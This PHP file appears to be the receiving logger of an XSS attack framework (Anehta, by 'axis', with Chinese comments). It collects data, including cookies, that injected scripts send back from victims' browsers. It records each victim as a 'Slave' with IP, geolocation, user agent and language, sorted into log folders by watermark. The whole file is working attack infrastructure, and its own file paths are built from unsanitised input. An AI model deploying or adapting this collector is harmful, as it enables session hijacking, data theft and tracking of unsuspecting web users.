<?php
// 记录抓取的信息
// Author: axis

//date_default_timezone_set(date_default_timezone_get());
date_default_timezone_set('Asia/Shanghai');


$fvck="Slave login at: ";

$border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";

$slaveip = "Slave IP: ".$_SERVER['REMOTE_ADDR'];   //获取IP
$slaveagent = "Slave User-Agent: ".$_SERVER['HTTP_USER_AGENT'];  // 浏览器和系统版本
$slavelang = "Slave Lang: ".$_SERVER['HTTP_ACCEPT_LANGUAGE'];  // 语言
//$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //请求时间
$requestdate = date("m/d/Y H:i:s"); 
//$requestdate = date(DATE_RFC822);
$qstr = $_SERVER['QUERY_STRING'];  // XSS传回的数据

if ($qstr == ""){ // logCache() POST 回来的数据
	$qstr = $_POST['anehtaInput_anehtaPostLogger'];
}

//查询地理位置
require("ip.php");
$slavelocation = "Slave Location: ".ip2location($_SERVER['REMOTE_ADDR']);
$slavelocation = iconv("gb2312","utf-8",$slavelocation); 


if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$slaveproxy = "Slave HTTP_X_FORWARDED_FOR: ".$_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
	$slaveproxy = "";
}

// 使用strpos 而不是 strchr ,因为更快,消耗内存更小
if ( strpos($qstr, "NoCryptMark") === false ){
	$qstr = base64_decode($qstr); // 解码base64
	$qstr = "XSS got: \r\n".urldecode($qstr);
} else {
  //$qstr = urldecode($qstr);
  $qstr = "XSS got: \r\n".urldecode($qstr);
}

/*
//剥离Cookie
$slavecookie = strchr($qstr, "    [**** Cookie");
$slavecookiepos = strpos($qstr, "    [**** Cookie");

// 剥离XSS来源
$slaveuri = substr($qstr, 0, $slavecookiepos);
*/

// 判断水印为null的情况
$slaveWatermark = strchr($qstr, "[**** Watermark: null");
if ( $slaveWatermark == false){ // 说明有水印
  // 分离出水印
  $slaveWatermark = strchr($qstr, "[**** Watermark: ");
  $slaveWatermark = strchr($slaveWatermark, "|");
}

// 如果没有打上水印,则为null,无法找到 "|"
if ($slaveWatermark != false){
  $slaveWatermark = "Slave_".substr($slaveWatermark, 1, 13);  // 分离出watermark(随机的时间值)
  
  // 按水印分目录记录日志
  if(file_exists("../slave/$slaveWatermark") == false){
    // 注意mkdir函数不能递归建立目录
    mkdir("../slave/$slaveWatermark");
  }
  
  // 如果是 logInfo()函数传回来的参数,如果为空则不记录
  $slave_logInfo = strchr($qstr, "[**** Info:  ****]");
  if($slave_logInfo == false){ // 说明Info 有信息;
    // 写日志
    $fp = fopen("../slave/$slaveWatermark/log.txt","a");
  }
}
else { // 水印为null的
	// 如果是 logInfo()函数传回来的参数,如果为空则不记录
  $slave_logInfo = strchr($qstr, "[**** Info:  ****]");
  if($slave_logInfo == false){ // 说明Info 有信息;
    if(file_exists("../slave/Slave_noWatermark") == false){
      // 注意mkdir函数不能递归建立目录
      mkdir("../slave/Slave_noWatermark");
    }
	  $fp = fopen("../slave/Slave_noWatermark/log.txt","a");
	}
}

if ($slaveproxy != ""){
	$outputlog = "$border\r\n $fvck $requestdate\r\n Slave WaterMark: $slaveWatermark\r\n $slaveip\r\n $slaveproxy\r\n $slavelocation\r\n $slaveagent\r\n $slavelang\r\n $qstr\r\n$border";
  fwrite($fp, $outputlog);
}
else {
	$outputlog = "$border\r\n $fvck $requestdate\r\n Slave WaterMark: $slaveWatermark\r\n $slaveip\r\n $slavelocation\r\n $slaveagent\r\n $slavelang\r\n $qstr\r\n$border";
	fwrite($fp, $outputlog);
}

fclose($fp);

?>